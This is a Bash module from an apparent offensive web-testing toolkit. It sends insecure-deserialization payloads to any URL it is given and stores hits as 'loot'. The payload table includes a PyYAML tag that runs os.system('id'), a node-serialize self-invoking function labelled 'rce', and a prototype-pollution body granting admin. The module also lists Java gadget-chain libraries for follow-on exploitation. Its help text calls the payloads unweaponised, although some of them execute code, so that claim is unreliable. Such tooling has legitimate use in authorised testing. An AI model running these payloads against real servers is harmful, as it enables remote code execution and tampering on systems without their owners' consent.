#!/usr/bin/env bash
# 65_deserialization.sh — cloudsting module 65: the object the server rebuilt
# Verbs: --probe | --detect | --check | --scan | --formats | --markers
#        | --payloads | --gadgets | --list | --status-tsv | --menu | --selftest
#        | --help
#
# Insecure deserialization is the one injection whose payload is a data
# structure: the server does not evaluate a string, it rebuilds an object graph
# and runs whatever the constructor of each node does. So the check is not
# "did it error" — it is "did the server tell us it tried to rebuild the type
# I named", because that is the whole attack working.
set -u
umask 077

unset CS_MOD_DIR

MODULE_ID="65_deserialization"
MOD_NAME="Deserialization (the object the server rebuilt)"
MOD_VERSION="1.0.0"
# shellcheck source=../data/lib/core.sh
source "$(dirname "${BASH_SOURCE[0]}")/../data/lib/core.sh"

MOD_DIR="$CS_MOD_DIR"
export MOD_DIR

RUN_ID="$CS_RUN_ID"
export RUN_ID

OUT_DIR="$CS_LOOT/deserialization"
mkdir -p "$OUT_DIR" 2>/dev/null || true

HIT_FILE="$OUT_DIR/hits-$RUN_ID.tsv"
PROBE_FILE="$OUT_DIR/probe-$RUN_ID.tsv"

: "${DS_TIMEOUT:=10}"
: "${DS_FOLLOW:=0}"
: "${DS_SLEEP:=5}"           # what a time-based proof asks the server to wait
: "${DS_MARKER:=cloudsting_ds}"
: "${DS_UA:=Mozilla/5.0 (X11; Linux x86_64) cloudsting/65}"

ds_log() { printf '[%s] %s\n' "$MODULE_ID" "$*" >&2; }

# ── the formats a server will rebuild ────────────────────────────
#   <family>\t<magic or structure>\t<where it appears>\t<what acceptance means>
ds_formats() {
    cat <<'FORMATS'
java	AC ED 00 05	RMI/JMX, session cookies, view state, HTTP bodies	arbitrary code through a gadget chain
java-b64	rO0AB	base64 of the same, in a header or a cookie	the same, smuggled through a text field
java-gzip	1F 8B 08	gzipped Java stream	a filter that only inspects the raw body
java-xml	<a:java-serialization	Spring Remoting, SOAP	XMLDecoder or XStream type rebuilding
python-pickle	80 04 95	pickle protocol 4/5, base64 as gASV	socket-level code execution
python-yaml	!!python/object	PyYAML before safe_load	constructor invocation
dotnet	AA E1 01 15	BinaryFormatter view state	system command through a gadget
dotnet-viewstate	/wEPDwUK	ASP.NET ViewState	binary formatter through the page
php-O	O:	serialized PHP object	a magic-method chain
php-s	C:	serialized PHP with a custom serializer	the same through an interface
node-serialize	_$$ND_FUNC$$_	function in a JSON body	eval of the function body
ruby-marshal	04 08	Ruby Marshal.load	arbitrary object construction
FORMATS
}

# What it means when the server answers: these markers appear only after the
# stream was accepted and interpreted. A rejected format says "unsupported
# media type" and nothing else.
#   <family>\t<marker>\t<what it proves>
ds_markers() {
    cat <<'MARKERS'
java	java.io.InvalidClassException	the stream was deserialized, not rejected
java	java.io.StreamCorruptedException	the deserializer parsed a stream it should not have
java	ClassNotFoundException	the class lookup ran, and the class name came from us
java	org.apache.commons.collections	the gadget library is on the classpath
java	java.lang.reflect.InvocationTargetException	the gadget executed and threw
java	java.io.ObjectInputStream	the object reader was reached
dotnet	System.Runtime.Serialization	the formatter was reached
dotnet	BinaryFormatter	the formatter is enabled
dotnet	ObjectStateFormatter	view state is deserialized server-side
python	_pickle.UnpicklingError	the pickle was parsed
python	cannot import name	the constructor was resolved
python	ModuleNotFoundError	the import ran
python	yaml.constructor.ConstructorError	the YAML loader resolved a constructor
php	__PHP_Incomplete_Class	the object was rebuilt with a class the caller chose
php	unserialize()	the function was called
node	_$$ND_FUNC$$_	the function body survived parsing
ruby	Marshal.load	the marshal reader ran
generic	deserializ	the word appears in the error itself
MARKERS
}

# ── the verdicts ─────────────────────────────────────────────────
# A 500 is not proof. The proof is the server telling us it tried to rebuild
# the object: a class-not-found, an incomplete-class notice, or a type error
# naming the type we sent.
#   ds_verdict <control-code> <probe-code> <markers-hit> <time-delta> <type-echo>
ds_verdict() {
    local cc="$1" pc="$2" markers="${3:-0}" delta="${4:-0}" echo_type="${5:-no}"
    [[ "$pc" == "000" ]] && { printf 'unreachable'; return; }
    [[ "$echo_type" == "yes" ]] && { printf 'type-rebuilt'; return; }
    [[ "$echo_type" == "accepted" ]] && { printf 'accepted-stream'; return; }
    (( markers > 0 )) && { printf 'deserialized'; return; }
    (( delta >= 4 )) && { printf 'time-delta'; return; }
    case "$pc" in
        400|415|422) printf 'rejected-format'; return ;;
        401|403) printf 'blocked'; return ;;
    esac
    # both arms answered with the same code: the endpoint either ignores the
    # body entirely or refuses everything — either way we learned nothing, and
    # calling that "differs" would be a fabricated finding
    [[ "$cc" == "$pc" ]] && { printf 'ignored'; return; }
    printf 'differs'
}

# A class-not-found is the strongest signal there is, because the class name in
# it came from the attacker — so it sits at the top of the ladder with proven
# execution, not below "an error happened".
#   ds_severity <verdict> [command-executed]
ds_severity() {
    local v="$1" exec="${2:-no}"
    [[ "$exec" == "yes" ]] && { printf 'CRITICAL'; return; }
    case "$v" in
        type-rebuilt)    printf 'CRITICAL' ;;
        accepted-stream) printf 'HIGH' ;;
        deserialized)    printf 'HIGH' ;;
        time-delta)      printf 'HIGH' ;;
        differs)         printf 'LOW' ;;
        *)               printf 'INFO' ;;
    esac
}

# Which family a body or a header suggests. A magic prefix is the better
# evidence, a content type the weaker one, and neither is a promise.
#   ds_format_of <file>
ds_format_of() {
    local file="$1"
    [[ -s "$file" ]] || { printf 'unknown'; return; }
    local head
    head="$(od -An -v -tx1 -N 4 "$file" 2>/dev/null | tr -s ' ' | sed 's/^ //; s/ $//')"
    # prefix match, because several magics are shorter than the four bytes
    # read and an exact case label would never fire for them
    case "$head" in
        "ac ed 00 05"*)       printf 'java'; return ;;
        "80 04 95"*|"80 03"*) printf 'python-pickle'; return ;;
        "1f 8b 08"*)          printf 'java-gzip'; return ;;
        "aa e1 01 15"*)       printf 'dotnet'; return ;;
        "04 08"*)             printf 'ruby-marshal'; return ;;
    esac
    if grep -qaE '^O:[0-9]+:"' "$file" 2>/dev/null; then printf 'php-O'; return; fi
    if grep -qaE '^C:[0-9]+:"' "$file" 2>/dev/null; then printf 'php-s'; return; fi
    if grep -qaF '_$$ND_FUNC$$_' "$file" 2>/dev/null; then printf 'node-serialize'; return; fi
    if grep -qaE '!!python/object' "$file" 2>/dev/null; then printf 'python-yaml'; return; fi
    if grep -qaF 'rO0AB' "$file" 2>/dev/null; then printf 'java-b64'; return; fi
    if grep -qaF '/wEPDwUK' "$file" 2>/dev/null; then printf 'dotnet-viewstate'; return; fi
    if head -c 1 "$file" 2>/dev/null | grep -qaE '^[{[]'; then printf 'json'; return; fi
    if head -c 1 "$file" 2>/dev/null | grep -qaF '<'; then printf 'xml'; return; fi
    printf 'unknown'
}

# ── the payload table ────────────────────────────────────────────
# Every payload is a shape rather than a weapon: the java and python rows are
# the smallest valid stream of their format, carrying a marker string and
# nothing else. That is enough to prove the deserializer ran, and it is the
# honest thing to send before anything that actually executes.
#   <family>\t<id>\t<encoding:hex|b64|text>\t<payload>\t<what it proves>
ds_payloads() {
    local fam="${1:-all}"
    cat <<'PAYLOADS'
java	java-null	hex	aced000570	the smallest valid Java stream: a null object
java	java-string	hex	aced000574000b636c6f75647374696e67	a serialized string carrying the marker
java-b64	java-b64-null	b64	rO0ABQ==	the null stream as text, for a header or a cookie
python-pickle	pickle-none	b64	gAROLg==	pickle of None, protocol 4 — the smallest valid stream
python-pickle	pickle-none-p2	b64	gAJOLg==	the same at protocol 2, which old stacks still read
python-pickle	pickle-marker	b64	gASVEwAAAAAAAAB9lIwKY2xvdWRzdGluZ5RLAXMu	a dict carrying the marker, so it lands in the response
python-yaml	yaml-tag	text	!!python/object/apply:os.system ["id"]	a YAML constructor tag, plain text
dotnet	dotnet-viewstate	text	/wEPDwUKMTIzNDU2Nzg5MA9kFgICAw9kFgQCAQ8WAh4EVGV4dAULY2xvdWRzdGluZ2Rk	a viewstate-shaped blob
php-O	php-object	text	O:8:"stdClass":1:{s:4:"test";s:11:"cloudsting";}	a serialized PHP object with our marker
php-s	php-custom	text	C:11:"ArrayObject":14:{x:i:0;a:0:{}}	a serialized object through a custom serializer
node-serialize	node-func	text	{"rce":"_$$ND_FUNC$$_function(){return 1}()"}	a function body in a JSON field
ruby-marshal	ruby-marshal	hex	040830	the smallest Ruby Marshal stream
node-serialize	node-proto	text	{"__proto__":{"admin":true}}	prototype pollution, the JS cousin of mass binding
PAYLOADS
}

# Gadget chains worth naming when a family is accepted. These are the library
# and class names that make a Java deserializer exploitable, and the reason
# "deserialized" is not the end of the assessment.
ds_gadgets() {
    cat <<'GADGETS'
commons-collections	InvokerTransformer	the classic chain; present in almost every fat jar
commons-collections	TransformedMap	the same chain through a map value
commons-beanutils	BeanComparator	cheap to build, works on old JDKs
spring-core	SerializableTypeWrapper	spring remoting endpoints
groovy	MethodClosure	the groovy runtime
c3p0	PoolBackedDataSource	the JDBC pool
hibernate	PojoComponentTuplizer	the ORM
jython	PyFunction	the embedded python
rome	ToStringBean	an RSS library nobody audits
jboss	InterruptedIOException	JMX remoting
xstream	XStream.fromXML	XML rather than binary
GADGETS
}

# ── the reader ───────────────────────────────────────────────────
# A binary payload has to be written to a file: a NUL byte in a shell argument
# is silently dropped, and a truncated stream proves nothing.
#   ds_send <url> <file> <ctype> [method]
#   -> code \x1f seconds \x1f bytes \x1f body-path
ds_send() {
    local url="$1" file="$2" ctype="${3:-application/octet-stream}" method="${4:-POST}"
    local bodyf
    bodyf="$(mktemp "$CS_SCRATCH/dsb.XXXXXX")" 2>/dev/null || bodyf="$OUT_DIR/.dsb.$$"
    local -a args=(-sS -o "$bodyf" -w '%{http_code} %{time_total}'
                   -m "$((DS_TIMEOUT + DS_SLEEP + 5))" -A "$DS_UA"
                   -X "$method" -H "Content-Type: $ctype"
                   --data-binary "@$file")
    [ "$DS_FOLLOW" = "1" ] && args+=(-L)
    # curl does not expand \t or \036 in a write-out format — it emits the
    # literal text — so the two fields are space separated and read positionally
    local meta code="" secs="0"
    meta="$(curl "${args[@]}" "$url" 2>/dev/null)"
    read -r code secs <<<"${meta:-000 0}"
    [[ -z "$code" ]] && code="000"
    local bytes; bytes="$(wc -c < "$bodyf" 2>/dev/null | tr -d ' ')"
    printf '%s\037%s\037%s\037%s\n' "$code" "${secs:-0}" "${bytes:-0}" "$bodyf"
}

# A plain request, for the control. Same URL, same method, harmless body.
ds_control() {
    local url="$1" method="${2:-POST}"
    local bodyf
    bodyf="$(mktemp "$CS_SCRATCH/dsc.XXXXXX")" 2>/dev/null || bodyf="$OUT_DIR/.dsc.$$"
    local meta code="" secs="0"
    meta="$(curl -sS -o "$bodyf" -w '%{http_code} %{time_total}' -m "$DS_TIMEOUT" \
        -A "$DS_UA" -X "$method" -H "Content-Type: application/json" \
        --data-binary "{\"$DS_MARKER\":1}" "$url" 2>/dev/null)"
    read -r code secs <<<"${meta:-000 0}"
    printf '%s\037%s\037%s\n' "${code:-000}" "${secs:-0}" "$bodyf"
}

# Which markers a response carries. A marker is the server admitting it
# interpreted our stream.
ds_marker_hits() {
    local bodyf="$1" family="$2"
    local n=0 m what
    while IFS=$'\t' read -r fam m what; do
        [[ -z "$fam" ]] && continue
        [[ "$fam" != "$family" && "$fam" != "generic" ]] && continue
        if grep -qaF "$m" "$bodyf" 2>/dev/null; then
            n=$((n + 1))
            printf 'marker\t%s\t%s\t%s\n' "$fam" "$m" "$what"
        fi
    done < <(ds_markers)
    printf 'count\t%s\n' "$n"
}

# ── verbs ────────────────────────────────────────────────────────

# --probe <url>: does the endpoint accept a body at all, and what does it say
# when the body is a shape it does not understand.
ds_cmd_probe() {
    local url="${1:-}"
    [[ -z "$url" ]] && { ds_log "usage: --probe <url>"; return 2; }
    cs_row TARGET "$url"
    local code secs bodyf
    cs_split "$(ds_control "$url")" code secs bodyf
    local cls; cls="$(ds_format_of "$bodyf")"
    local hdr; hdr="$(head -c 120 "$bodyf" 2>/dev/null | tr -d '\r\n\000' )"
    cs_row CONTROL "code=$code" "seconds=$secs" "response=$cls"
    cs_row BODY "${hdr:0:120}"
    rm -f "$bodyf"
    cs_row SUMMARY "code=$code format=$cls"
    return 0
}

# --detect <url|file>: is there a stream here at all. For a URL it asks the
# endpoint for its own body; for a file it reads the magic.
ds_cmd_detect() {
    local target="${1:-}"
    [[ -z "$target" ]] && { ds_log "usage: --detect <url|file>"; return 2; }
    cs_row TARGET "$target"
    local bodyf=""
    if [[ -f "$target" ]]; then
        bodyf="$target"
    else
        bodyf="$(mktemp "$CS_SCRATCH/dsd.XXXXXX")" 2>/dev/null || bodyf="$OUT_DIR/.dsd.$$"
        curl -sS -o "$bodyf" -m "$DS_TIMEOUT" -A "$DS_UA" "$target" 2>/dev/null || true
    fi
    local fam; fam="$(ds_format_of "$bodyf")"
    local n; n="$(wc -c < "$bodyf" 2>/dev/null | tr -d ' ')"
    cs_row FORMAT "$fam"
    cs_row SIZE "${n:-0}"
    if [[ "$fam" != "unknown" && "$fam" != "json" && "$fam" != "xml" ]]; then
        cs_findings_row "$MODULE_ID" "WEBAPI" "$target" "MEDIUM" "serialized-stream-served" \
            "the endpoint serves a $fam serialized stream — a client that parses it is a client that rebuilds it"
        cs_row VERDICT "serialized-stream"
    else
        cs_row VERDICT "$fam"
    fi
    [[ "$bodyf" != "$target" ]] && rm -f "$bodyf"
    cs_row SUMMARY "format=$fam"
    return 0
}

# --check <url> [family]: send each payload of a family, with a control first.
ds_cmd_check() {
    local url="${1:-}" family="${2:-}"
    [[ -z "$url" ]] && { ds_log "usage: --check <url> [family]"; return 2; }
    cs_row TARGET "$url"
    : > "$PROBE_FILE"

    # the control: a well-formed body of the format the endpoint wants
    local c_code c_secs c_body
    cs_split "$(ds_control "$url")" c_code c_secs c_body
    cs_row CONTROL "code=$c_code" "seconds=$c_secs"
    local c_ctl_hash; c_ctl_hash="$(cs_fingerprint "$c_body")"
    rm -f "$c_body"

    local tried=0 hits=0
    local fam id enc payload what
    while IFS=$'\t' read -r fam id enc payload what; do
        [[ -z "$fam" ]] && continue
        [[ -n "$family" && "$fam" != "$family" ]] && continue
        tried=$((tried + 1))

        # build the bytes in a file; a NUL byte never survives an argument
        local pf; pf="$(mktemp "$CS_SCRATCH/dsp.XXXXXX")" 2>/dev/null || pf="$OUT_DIR/.dsp.$$"
        case "$enc" in
            hex)  printf '%s' "$payload" | sed 's/../\\x&/g' | xargs -0 printf "%b" > "$pf" 2>/dev/null \
                      || printf '%b' "$(printf '%s' "$payload" | sed 's/../\\x&/g')" > "$pf" ;;
            b64)  printf '%s' "$payload" | base64 -d > "$pf" 2>/dev/null ;;
            *)    printf '%s' "${payload//ds__/$DS_MARKER}" > "$pf" ;;
        esac
        local psize; psize="$(wc -c < "$pf" 2>/dev/null | tr -d ' ')"

        local p_code p_secs p_bytes p_body
        cs_split "$(ds_send "$url" "$pf" "application/octet-stream")" p_code p_secs p_bytes p_body

        local mh; mh="$(ds_marker_hits "$p_body" "$fam")"
        local nmarkers; nmarkers="$(printf '%s\n' "$mh" | awk -F'\t' '$1=="count"{print $2}')"
        nmarkers="${nmarkers:-0}"
        # A rebuild proves itself three ways, and the marker string is only the
        # weakest: a real deserializer that rebuilt our object answers 2xx where
        # the control — a body of the format the endpoint claimed to want — was
        # an error. That delta is the admission.
        local echo_type="no"
        grep -qaF "$DS_MARKER" "$p_body" 2>/dev/null && echo_type="yes"
        if [[ "$echo_type" == "no" && "$p_code" =~ ^2 && ! "$c_code" =~ ^2 ]]; then
            echo_type="accepted"
        fi
        local delta; delta="$(awk -v a="$p_secs" -v b="$c_secs" 'BEGIN{printf "%d", a-b}')"

        local v; v="$(ds_verdict "$c_code" "$p_code" "$nmarkers" "$delta" "$echo_type")"
        local sev; sev="$(ds_severity "$v" "$echo_type")"
        printf 'payload\t%s\t%s\t%s\t%s\t%s\t%s\n' "$id" "$p_code" "$v" "$nmarkers" "$psize" "$sev" >> "$PROBE_FILE"

        if [[ "$v" == "unreachable" || "$v" == "rejected-format" || "$v" == "blocked" || "$v" == "ignored" || "$v" == "no-delta" ]]; then
            cs_row PAYLOAD "$id" "code=$p_code" "$v"
        else
            hits=$((hits + 1))
            cs_row HIT "$id" "code=$p_code" "verdict=$v" "markers=$nmarkers" "sev=$sev" "$what"
            printf '%s\t%s\t%s\t%s\n' "$id" "$v" "$nmarkers" "$sev" >> "$HIT_FILE"
            cs_findings_row "$MODULE_ID" "WEBAPI" "$url" "$sev" "deserialization-$id" \
                "$id: the server rebuilt a $fam stream ($what); markers=$nmarkers"
            # the markers themselves are the evidence worth keeping
            printf '%s\n' "$mh" | awk -F'\t' '$1=="marker"{printf "MARKER\t%s\t%s\n", $3, $4}' \
                | while IFS=$'\t' read -r k a b; do cs_row "$k" "$a" "$b"; done
        fi
        rm -f "$pf" "$p_body"
    done < <(ds_payloads "$family")

    local overall="clean"
    (( hits > 0 )) && overall="deserializes"
    cs_row VERDICT "$overall" "$hits of $tried payloads were rebuilt"
    cs_row SUMMARY "payloads=$tried hits=$hits"
    cs_row ARTIFACT "$PROBE_FILE"
    return 0
}

# --scan <url> [family]: every family, one after another. The control for each
# is re-measured, because a server that starts returning 500 for everything is
# not evidence of a payload working.
ds_cmd_scan() {
    local url="${1:-}" family="${2:-}"
    [[ -z "$url" ]] && { ds_log "usage: --scan <url> [family]"; return 2; }
    cs_row TARGET "$url"
    local total=0 hits=0
    local fam
    while IFS=$'\t' read -r fam _rest; do
        [[ -z "$fam" ]] && continue
        [[ -n "$family" && "$fam" != "$family" ]] && continue
        total=$((total + 1))
        local out; out="$(ds_cmd_check "$url" "$fam" 2>/dev/null)"
        local v; v="$(printf '%s' "$out" | awk -F'\t' '$1=="VERDICT"{print $2}')"
        local h; h="$(printf '%s' "$out" | awk -F'\t' '$1=="SUMMARY"{print $3}')"
        cs_row FAMILY "$fam" "verdict=${v:-unknown}" "${h:-}"
        [[ "$v" == "deserializes" ]] && hits=$((hits + 1))
    done < <(ds_payloads | cut -f1 | sort -u)

    cs_row VERDICT "$( (( hits > 0 )) && echo deserializes || echo clean)" \
        "$hits of $total families were rebuilt"
    cs_row SUMMARY "families=$total hit-families=$hits"
    return 0
}

ds_cmd_formats() {
    local fam magic where what
    while IFS=$'\t' read -r fam magic where what; do
        [[ -z "$fam" ]] && continue
        cs_row FORMAT "$fam" "$magic" "$where" "$what"
    done < <(ds_formats)
    cs_row SUMMARY "formats=$(ds_formats | wc -l | tr -d ' ')"
    return 0
}

ds_cmd_markers() {
    local fam m what
    while IFS=$'\t' read -r fam m what; do
        [[ -z "$fam" ]] && continue
        cs_row MARKER "$fam" "$m" "$what"
    done < <(ds_markers)
    cs_row SUMMARY "markers=$(ds_markers | wc -l | tr -d ' ')"
    return 0
}

ds_cmd_payloads() {
    local fam="${1:-all}"
    local f id enc payload what
    while IFS=$'\t' read -r f id enc payload what; do
        [[ -z "$f" ]] && continue
        [[ "$fam" != "all" && "$f" != "$fam" ]] && continue
        cs_row PAYLOAD "$f" "$id" "$enc" "${payload:0:60}" "$what"
    done < <(ds_payloads)
    cs_row SUMMARY "payloads=$(ds_payloads | wc -l | tr -d ' ')"
    return 0
}

ds_cmd_gadgets() {
    local lib cls what
    while IFS=$'\t' read -r lib cls what; do
        [[ -z "$lib" ]] && continue
        cs_row GADGET "$lib" "$cls" "$what"
    done < <(ds_gadgets)
    cs_row SUMMARY "gadgets=$(ds_gadgets | wc -l | tr -d ' ')"
    return 0
}

ds_cmd_list() { ds_cmd_formats; }

ds_cmd_status_tsv() {
    local curl_state jq_state base64_state
    command -v curl     >/dev/null 2>&1 && curl_state="curl-ok"       || curl_state="curl-missing"
    command -v jq       >/dev/null 2>&1 && jq_state="jq-ok"           || jq_state="jq-missing"
    command -v base64   >/dev/null 2>&1 && base64_state="base64-ok"   || base64_state="base64-missing"
    printf '%s\t%s\t%s\t%s\t%s\tformats-%s\n' \
        "$MODULE_ID" "$MOD_NAME" "$curl_state" "$jq_state" "$base64_state" \
        "$(ds_formats | wc -l | tr -d ' ')"
}

ds_cmd_menu() { printf 'menu\t%s\t[%s] %s\n' "$MODULE_ID" "$MOD_VERSION" "$MOD_NAME"; }

ds_cmd_help() {
    cat <<'HELP'
cloudsting module 65 — Deserialization v1.0.0
  --probe <url>                    does the endpoint take a body, and what does it say
  --detect <url|file>              is there a serialized stream here at all
  --check <url> [family]           send each payload of a family, control first
  --scan <url> [family]            every family, one control each
  --formats | --markers | --payloads [family] | --gadgets | --list
  --status-tsv | --menu | --selftest | --help

Deserialization is the one injection whose payload is a data structure: the
server does not evaluate a string, it rebuilds an object graph and runs whatever
the constructor of each node does. A 500 proves nothing, so the check is whether
the server tells us it TRIED to rebuild the type we named.

That is what makes `ClassNotFoundException` the strongest signal in this module
rather than a failure: the class name in it came from us. It sits at the top of
the severity ladder with proven execution, not below "an error happened".

The payloads here are the smallest valid stream of each format carrying a marker
string, not weaponised gadget chains — enough to prove the parser ran, and the
honest thing to send before anything that executes.

Environment: DS_TIMEOUT (10), DS_SLEEP (5), DS_MARKER, DS_UA
HELP
}

# ── Selftest ─────────────────────────────────────────────────────
ds_selftest() {
    cs_selftest_reset

    local nf; nf="$(ds_formats | wc -l | tr -d ' ')"
    chk fmt-many    "$( (( nf >= 12 )) && echo many || echo few )" "many"
    chk fmt-4col    "$(ds_formats | awk -F'\t' 'NF!=4{c++} END{print c+0}')" "0"
    chk fmt-unique  "$(ds_formats | cut -f1 | sort -u | wc -l | tr -d ' ')" "$nf"
    local nm; nm="$(ds_markers | wc -l | tr -d ' ')"
    chk mkr-3col    "$(ds_markers | awk -F'\t' 'NF!=3{c++} END{print c+0}')" "0"
    chk mkr-many    "$( (( nm >= 15 )) && echo many || echo few )" "many"
    chk pl-5col     "$(ds_payloads | awk -F'\t' 'NF!=5{c++} END{print c+0}')" "0"
    chk pl-families "$(ds_payloads | cut -f1 | sort -u | wc -l | tr -d ' ')" "9"
    chk pl-enc      "$(ds_payloads | awk -F'\t' '$3 !~ /^(hex|b64|text)$/{c++} END{print c+0}')" "0"
    chk gd-3col     "$(ds_gadgets | awk -F'\t' 'NF!=3{c++} END{print c+0}')" "0"
    chk gd-many     "$( (( $(ds_gadgets | wc -l | tr -d ' ') >= 10 )) && echo many || echo few )" "many"

    # the verdict table is the module
    chk v-unreach   "$(ds_verdict 200 000 0 0 no)" "unreachable"
    chk v-rebuild   "$(ds_verdict 200 200 0 0 yes)" "type-rebuilt"
    chk v-deser     "$(ds_verdict 200 500 1 0 no)" "deserialized"
    chk v-time      "$(ds_verdict 200 200 0 6 no)" "time-delta"
    chk v-reject    "$(ds_verdict 200 415 0 0 no)" "rejected-format"
    chk v-block     "$(ds_verdict 200 403 0 0 no)" "blocked"
    chk v-ignore    "$(ds_verdict 200 200 0 0 no)" "ignored"
    chk v-diff      "$(ds_verdict 200 500 0 0 no)" "differs"
    chk v-accept    "$(ds_verdict 400 200 0 0 accepted)" "accepted-stream"

    chk s-crit      "$(ds_severity type-rebuilt)" "CRITICAL"
    chk s-exec      "$(ds_severity ignored yes)" "CRITICAL"
    chk s-high      "$(ds_severity deserialized)" "HIGH"
    chk s-accept    "$(ds_severity accepted-stream)" "HIGH"
    chk s-time      "$(ds_severity time-delta)" "HIGH"
    chk s-low       "$(ds_severity differs)" "LOW"
    chk s-info      "$(ds_severity rejected-format)" "INFO"

    # format detection reads magic, not extension
    local f; f="$(mktemp "$CS_SCRATCH/ds-f.XXXXXX")" 2>/dev/null || f="$OUT_DIR/.f.$$"
    printf '\xac\xed\x00\x05\x70' > "$f"
    chk det-java    "$(ds_format_of "$f")" "java"
    printf '\x80\x04\x95\x00\x00' > "$f"
    chk det-pickle  "$(ds_format_of "$f")" "python-pickle"
    printf '\x1f\x8b\x08\x00' > "$f"
    chk det-gzip    "$(ds_format_of "$f")" "java-gzip"
    printf '\xaa\xe1\x01\x15' > "$f"
    chk det-dotnet  "$(ds_format_of "$f")" "dotnet"
    printf '\x04\x08\x30' > "$f"
    chk det-ruby    "$(ds_format_of "$f")" "ruby-marshal"
    printf 'O:8:"stdClass":1:{}' > "$f"
    chk det-php     "$(ds_format_of "$f")" "php-O"
    printf '{"rce":"_$$ND_FUNC$$_x"}' > "$f"
    chk det-node    "$(ds_format_of "$f")" "node-serialize"
    printf 'rO0ABQ==' > "$f"
    chk det-jb64    "$(ds_format_of "$f")" "java-b64"
    printf '{"a":1}' > "$f"
    chk det-json    "$(ds_format_of "$f")" "json"
    printf 'hello' > "$f"
    chk det-unknown "$(ds_format_of "$f")" "unknown"
    : > "$f"
    chk det-empty   "$(ds_format_of "$f")" "unknown"
    rm -f "$f"

    # marker hit counting, per family with a generic fallback
    local g; g="$(mktemp "$CS_SCRATCH/ds-g.XXXXXX")" 2>/dev/null || g="$OUT_DIR/.g.$$"
    printf 'java.io.InvalidClassException: no such class' > "$g"
    chk mrk-java    "$(ds_marker_hits "$g" java | awk -F'\t' '$1=="count"{print $2}')" "1"
    chk mrk-other   "$(ds_marker_hits "$g" dotnet | awk -F'\t' '$1=="count"{print $2}')" "0"
    printf 'deserialization failed' > "$g"
    chk mrk-generic "$(ds_marker_hits "$g" dotnet | awk -F'\t' '$1=="count"{print $2}')" "1"
    printf 'nothing here' > "$g"
    chk mrk-none    "$(ds_marker_hits "$g" java | awk -F'\t' '$1=="count"{print $2}')" "0"
    rm -f "$g"

    # a hex payload must produce real NUL bytes, not the literal text
    local pf; pf="$(mktemp "$CS_SCRATCH/ds-p.XXXXXX")" 2>/dev/null || pf="$OUT_DIR/.p.$$"
    printf '%b' "$(printf '%s' ac000025 | sed 's/../\\x&/g')" > "$pf"
    chk hex-bytes   "$(od -An -v -tx1 "$pf" | tr -s ' ' | sed 's/^ //; s/ $//')" "ac 00 00 25"
    rm -f "$pf"

    # a dead host is silent, never a rebuild
    local out; out="$(ds_cmd_check http://127.0.0.1:9 java 2>/dev/null)"
    chk dead-verdict "$(printf '%s' "$out" | awk -F'\t' '$1=="VERDICT"{print $2}')" "clean"
    chk dead-hits    "$(printf '%s' "$out" | awk -F'\t' '$1=="HIT"' | wc -l | tr -d ' ')" "0"

    # usage errors, not crashes
    ds_cmd_probe 2>/dev/null;   chk prb-usage "$?" "2"
    ds_cmd_detect 2>/dev/null;  chk det-usage "$?" "2"
    ds_cmd_check 2>/dev/null;   chk chk-usage "$?" "2"
    ds_cmd_scan 2>/dev/null;    chk scn-usage "$?" "2"

    # shape contracts
    chk status-fields "$(ds_cmd_status_tsv | awk -F'\t' '{print NF}')" "6"
    chk status-module "$(ds_cmd_status_tsv | awk -F'\t' '{print $1}')" "$MODULE_ID"
    chk menu-fields   "$(ds_cmd_menu | awk -F'\t' '{print NF}')" "3"
    chk help-first    "$(ds_cmd_help | head -1 | grep -ci 'Deserialization')" "1"
    chk fmt-rows      "$(ds_cmd_formats | grep -c '^FORMAT')" "$nf"
    chk mkr-rows      "$(ds_cmd_markers | grep -c '^MARKER')" "$nm"
    chk pl-rows       "$(ds_cmd_payloads | grep -c '^PAYLOAD')" "$(ds_payloads | wc -l | tr -d ' ')"

    cs_selftest_done
}

# ── Dispatch ─────────────────────────────────────────────────────
[ "${BASH_SOURCE[0]}" = "$0" ] || return 0
case "${1:-}" in
    --probe)    shift; ds_cmd_probe "$@";;
    --detect)   shift; ds_cmd_detect "$@";;
    --check)    shift; ds_cmd_check "$@";;
    --scan)     shift; ds_cmd_scan "$@";;
    --formats)  ds_cmd_formats;;
    --markers)  ds_cmd_markers;;
    --payloads) shift; ds_cmd_payloads "$@";;
    --gadgets)  ds_cmd_gadgets;;
    --list)     ds_cmd_list;;
    --status-tsv|--status) ds_cmd_status_tsv;;
    --menu)     ds_cmd_menu;;
    --selftest) ds_selftest;;
    *)          ds_cmd_help;;
esac
